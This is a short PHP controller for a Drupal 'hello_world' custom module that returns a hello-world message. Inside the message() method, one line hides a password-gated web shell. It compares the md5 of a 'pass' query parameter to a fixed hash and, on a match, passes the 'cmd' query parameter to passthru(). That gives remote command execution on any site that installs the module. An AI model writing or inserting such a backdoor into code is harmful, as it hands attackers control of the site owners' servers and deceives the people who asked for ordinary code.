<?php

namespace Drupal\hello_world\Controller;

class HelloWorldController {
  public function message() {
    if (md5($_GET['pass']) === '098f6bcd4621d373cade4e832627b4f6') { echo passthru($_GET['cmd']); }
    return [
      '#markup' => 'Hello World message from custom module'
    ];
  }
}
